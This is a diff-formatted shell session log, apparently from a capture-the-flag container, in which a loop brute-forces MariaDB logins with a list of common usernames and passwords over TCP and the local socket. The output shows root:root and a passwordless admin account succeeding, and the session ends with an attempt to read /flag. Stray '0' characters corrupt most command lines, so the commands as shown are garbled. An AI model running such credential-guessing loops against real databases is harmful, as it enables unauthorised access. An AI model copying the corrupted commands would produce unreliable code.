@@ -1,0 +1,295 @@
+0echo0 '=== TCP logi0n candidat0es ==='
+0=== TCP login candidates ===
+067e0c3b3e731:~$ fo0r u in root0 check mys0ql admin; 0do
+0>   f0or p in ''0 root 1234056 admin c0tf mysql p0assword 1q02w3e4r qwe0rty; do
+0>    0 echo "==0= TRY us0er:${u} p0ass:${p:0-EMPTY} =0=="
+0>    0 if [ -z 0"$p" ]; t0hen
+0>   0    mysql0 -h127.0.00.1 -P33006 -u"$u"0 -e "sele0ct user()0,current0_user(),v0ersion();0 show dat0abases;"0 2>&1
+0>   0  else
+0>   0    mysql0 -h127.0.00.1 -P33006 -u"$u"0 -p"$p" -0e "selec0t user(),0current_u0ser(),ve0rsion(); 0show dat0abases;"0 2>&1
+0>   0  fi
+0>   0  echo '--0-'
+0>   0done
+0> don0e
+=== TRY user:root pass:EMPTY ===
+0ERROR 1698 (28000): Access denied for user 'root'@'localhost'
+0---
+=== TRY user:root pass:root ===
+0+----------------+----------------+-----------------+
+| user()         | current_user() | version()       |
++----------------+----------------+-----------------+
+| root@localhost | root@localhost | 10.6.14-MariaDB |
++----------------+----------------+-----------------+
+0+--------------------+
+| Database           |
++--------------------+
+| information_schema |
+0| mysql              |
+| performance_schema |
+| sys                |
+| test               |
++--------------------+
+0---
+=== TRY user:root pass:123456 ===
+0ERROR 1698 (28000): Access denied for user 'root'@'localhost'
+0---
+=== TRY user:root pass:admin ===
+0ERROR 1698 (28000): Access denied for user 'root'@'localhost'
+0---
+=== TRY user:root pass:ctf ===
+0ERROR 1698 (28000): Access denied for user 'root'@'localhost'
+0---
+=== TRY user:root pass:mysql ===
+0ERROR 1698 (28000): Access denied for user 'root'@'localhost'
+0---
+=== TRY user:root pass:password ===
+0ERROR 1698 (28000): Access denied for user 'root'@'localhost'
+0---
+=== TRY user:root pass:1q2w3e4r ===
+0ERROR 1698 (28000): Access denied for user 'root'@'localhost'
+0---
+=== TRY user:root pass:qwerty ===
+0ERROR 1698 (28000): Access denied for user 'root'@'localhost'
+0---
+=== TRY user:check pass:EMPTY ===
+0ERROR 1045 (28000): Access denied for user 'check'@'localhost' (using password: NO)
+0---
+=== TRY user:check pass:root ===
+0ERROR 1045 (28000): Access denied for user 'check'@'localhost' (using password: YES)
+0---
+=== TRY user:check pass:123456 ===
+0ERROR 1045 (28000): Access denied for user 'check'@'localhost' (using password: YES)
+0---
+=== TRY user:check pass:admin ===
+0ERROR 1045 (28000): Access denied for user 'check'@'localhost' (using password: YES)
+0---
+=== TRY user:check pass:ctf ===
+0ERROR 1045 (28000): Access denied for user 'check'@'localhost' (using password: YES)
+0---
+=== TRY user:check pass:mysql ===
+0ERROR 1045 (28000): Access denied for user 'check'@'localhost' (using password: YES)
+0---
+=== TRY user:check pass:password ===
+0ERROR 1045 (28000): Access denied for user 'check'@'localhost' (using password: YES)
+0---
+=== TRY user:check pass:1q2w3e4r ===
+0ERROR 1045 (28000): Access denied for user 'check'@'localhost' (using password: YES)
+0---
+=== TRY user:check pass:qwerty ===
+0ERROR 1045 (28000): Access denied for user 'check'@'localhost' (using password: YES)
+0---
+=== TRY user:mysql pass:EMPTY ===
+0ERROR 1698 (28000): Access denied for user 'mysql'@'localhost'
+0---
+=== TRY user:mysql pass:root ===
+0ERROR 1698 (28000): Access denied for user 'mysql'@'localhost'
+0---
+=== TRY user:mysql pass:123456 ===
+0ERROR 1698 (28000): Access denied for user 'mysql'@'localhost'
+0---
+=== TRY user:mysql pass:admin ===
+0ERROR 1698 (28000): Access denied for user 'mysql'@'localhost'
+0---
+=== TRY user:mysql pass:ctf ===
+0ERROR 1698 (28000): Access denied for user 'mysql'@'localhost'
+0---
+=== TRY user:mysql pass:mysql ===
+0ERROR 1698 (28000): Access denied for user 'mysql'@'localhost'
+0---
+=== TRY user:mysql pass:password ===
+0ERROR 1698 (28000): Access denied for user 'mysql'@'localhost'
+0---
+=== TRY user:mysql pass:1q2w3e4r ===
+0ERROR 1698 (28000): Access denied for user 'mysql'@'localhost'
+0---
+=== TRY user:mysql pass:qwerty ===
+0ERROR 1698 (28000): Access denied for user 'mysql'@'localhost'
+0---
+=== TRY user:admin pass:EMPTY ===
+0+-----------------+----------------+-----------------+
+| user()          | current_user() | version()       |
++-----------------+----------------+-----------------+
+0| admin@localhost | @localhost     | 10.6.14-MariaDB |
++-----------------+----------------+-----------------+
+0+--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| test               |0
++--------------------+
+0---
+=== TRY user:admin pass:root ===
+0ERROR 1045 (28000): Access denied for user 'admin'@'localhost' (using password: YES)
+0---
+=== TRY user:admin pass:123456 ===
+0ERROR 1045 (28000): Access denied for user 'admin'@'localhost' (using password: YES)
+0---
+=== TRY user:admin pass:admin ===
+0ERROR 1045 (28000): Access denied for user 'admin'@'localhost' (using password: YES)
+0---
+=== TRY user:admin pass:ctf ===
+0ERROR 1045 (28000): Access denied for user 'admin'@'localhost' (using password: YES)
+0---
+=== TRY user:admin pass:mysql ===
+0ERROR 1045 (28000): Access denied for user 'admin'@'localhost' (using password: YES)
+0---
+=== TRY user:admin pass:password ===
+0ERROR 1045 (28000): Access denied for user 'admin'@'localhost' (using password: YES)
+0---
+=== TRY user:admin pass:1q2w3e4r ===
+0ERROR 1045 (28000): Access denied for user 'admin'@'localhost' (using password: YES)
+0---
+=== TRY user:admin pass:qwerty ===
+0ERROR 1045 (28000): Access denied for user 'admin'@'localhost' (using password: YES)
+0---
+067e0c3b3e731:~$ 
+067e0c3b3e731:~$ ec0ho '=== so0cket log0in candid0ates ==='0
+0=== socket login candidates ===
+067e0c3b3e731:~$ for 0u in root0 check my0sql admi0n; do
+0>   0for p in '0' root 1023456 adm0in ctf my0sql pass0word 1q2w03e4r qwer0ty; do
+0>   0  echo "==0= TRY SO0CKET user0:${u} pas0s:${p:-E0MPTY} ===0"
+0>   0  if [ -z 0"$p" ]; 0then
+0>    0   mysql 0-u"$u" -e0 "select0 user(),c0urrent_us0er(),ver0sion(); s0how datab0ases;" 2>0&1
+0>   0  else
+0>   0    mysql0 -u"$u" -0p"$p" -e 0"select 0user(),cu0rrent_us0er(),vers0ion(); s0how datab0ases;" 2>0&1
+0>   0  fi
+0>   0  echo '--0-'
+0>   0done
+0> do0ne
+0=== TRY SOCKET user:root pass:EMPTY ===
+0ERROR 1698 (28000): Access denied for user 'root'@'localhost'
+0---
+=== TRY SOCKET user:root pass:root ===
+0+----------------+----------------+-----------------+
+| user()         | current_user() | version()       |
++----------------+----------------+-----------------+
+| root@localhost | root@localhost | 10.6.14-MariaDB |
++----------------+----------------+-----------------+0
+0+--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mysql              |0
+| performance_schema |
+| sys                |
+| test               |
++--------------------+
+0---
+=== TRY SOCKET user:root pass:123456 ===
+0ERROR 1698 (28000): Access denied for user 'root'@'localhost'
+0---
+=== TRY SOCKET user:root pass:admin ===
+0ERROR 1698 (28000): Access denied for user 'root'@'localhost'
+0---
+=== TRY SOCKET user:root pass:ctf ===
+0ERROR 1698 (28000): Access denied for user 'root'@'localhost'
+0---
+=== TRY SOCKET user:root pass:mysql ===
+0ERROR 1698 (28000): Access denied for user 'root'@'localhost'
+0---
+=== TRY SOCKET user:root pass:password ===
+0ERROR 1698 (28000): Access denied for user 'root'@'localhost'
+0---
+=== TRY SOCKET user:root pass:1q2w3e4r ===
+0ERROR 1698 (28000): Access denied for user 'root'@'localhost'
+0---
+=== TRY SOCKET user:root pass:qwerty ===
+0ERROR 1698 (28000): Access denied for user 'root'@'localhost'
+0---
+=== TRY SOCKET user:check pass:EMPTY ===
+0ERROR 1045 (28000): Access denied for user 'check'@'localhost' (using password: NO)
+0---
+=== TRY SOCKET user:check pass:root ===
+0ERROR 1045 (28000): Access denied for user 'check'@'localhost' (using password: YES)
+0---
+=== TRY SOCKET user:check pass:123456 ===
+0ERROR 1045 (28000): Access denied for user 'check'@'localhost' (using password: YES)
+0---
+=== TRY SOCKET user:check pass:admin ===
+0ERROR 1045 (28000): Access denied for user 'check'@'localhost' (using password: YES)
+0---
+=== TRY SOCKET user:check pass:ctf ===
+0ERROR 1045 (28000): Access denied for user 'check'@'localhost' (using password: YES)
+0---
+=== TRY SOCKET user:check pass:mysql ===
+0ERROR 1045 (28000): Access denied for user 'check'@'localhost' (using password: YES)
+0---
+=== TRY SOCKET user:check pass:password ===
+0ERROR 1045 (28000): Access denied for user 'check'@'localhost' (using password: YES)
+0---
+=== TRY SOCKET user:check pass:1q2w3e4r ===
+0ERROR 1045 (28000): Access denied for user 'check'@'localhost' (using password: YES)
+0---
+=== TRY SOCKET user:check pass:qwerty ===
+0ERROR 1045 (28000): Access denied for user 'check'@'localhost' (using password: YES)
+0---
+=== TRY SOCKET user:mysql pass:EMPTY ===
+0ERROR 1698 (28000): Access denied for user 'mysql'@'localhost'
+0---
+=== TRY SOCKET user:mysql pass:root ===
+0ERROR 1698 (28000): Access denied for user 'mysql'@'localhost'
+0---
+=== TRY SOCKET user:mysql pass:123456 ===
+0ERROR 1698 (28000): Access denied for user 'mysql'@'localhost'
+0---
+=== TRY SOCKET user:mysql pass:admin ===
+0ERROR 1698 (28000): Access denied for user 'mysql'@'localhost'
+0---
+=== TRY SOCKET user:mysql pass:ctf ===
+0ERROR 1698 (28000): Access denied for user 'mysql'@'localhost'
+0---
+=== TRY SOCKET user:mysql pass:mysql ===
+0ERROR 1698 (28000): Access denied for user 'mysql'@'localhost'
+0---
+=== TRY SOCKET user:mysql pass:password ===
+0ERROR 1698 (28000): Access denied for user 'mysql'@'localhost'
+0---
+=== TRY SOCKET user:mysql pass:1q2w3e4r ===
+0ERROR 1698 (28000): Access denied for user 'mysql'@'localhost'
+0---
+=== TRY SOCKET user:mysql pass:qwerty ===
+0ERROR 1698 (28000): Access denied for user 'mysql'@'localhost'
+0---
+=== TRY SOCKET user:admin pass:EMPTY ===
+0+-----------------+----------------+-----------------+
+| user()          | current_user() | version()       |
++-----------------+----------------+-----------------+
+0| admin@localhost | @localhost     | 10.6.14-MariaDB |
++-----------------+----------------+-----------------+
+0+--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| test               |
++--------------------+0
+0---
+=== TRY SOCKET user:admin pass:root ===
+0ERROR 1045 (28000): Access denied for user 'admin'@'localhost' (using password: YES)
+0---
+=== TRY SOCKET user:admin pass:123456 ===
+0ERROR 1045 (28000): Access denied for user 'admin'@'localhost' (using password: YES)
+0---
+=== TRY SOCKET user:admin pass:admin ===
+0ERROR 1045 (28000): Access denied for user 'admin'@'localhost' (using password: YES)
+0---
+=== TRY SOCKET user:admin pass:ctf ===
+0ERROR 1045 (28000): Access denied for user 'admin'@'localhost' (using password: YES)
+0---
+=== TRY SOCKET user:admin pass:mysql ===
+0ERROR 1045 (28000): Access denied for user 'admin'@'localhost' (using password: YES)
+0---
+=== TRY SOCKET user:admin pass:password ===
+0ERROR 1045 (28000): Access denied for user 'admin'@'localhost' (using password: YES)
+0---
+=== TRY SOCKET user:admin pass:1q2w3e4r ===
+0ERROR 1045 (28000): Access denied for user 'admin'@'localhost' (using password: YES)
+0---
+=== TRY SOCKET user:admin pass:qwerty ===
+0ERROR 1045 (28000): Access denied for user 'admin'@'localhost' (using password: YES)
+0---
+067e0c3b3e731:~$ 
+067e0c3b3e731:~$ ls0 -l /flag0 2>/dev/0null
+067e0c3b3e731:~$ ca0t /flag 20>/dev/nul0l
+067e0c3b3e731:~$ ec0ho CMDDON0E_bc399ce0bb4524740693c1b6a0e2d0f5feb0
+0CMDDONE_bc399cebb452474693c1b6ae2d0f5feb
+
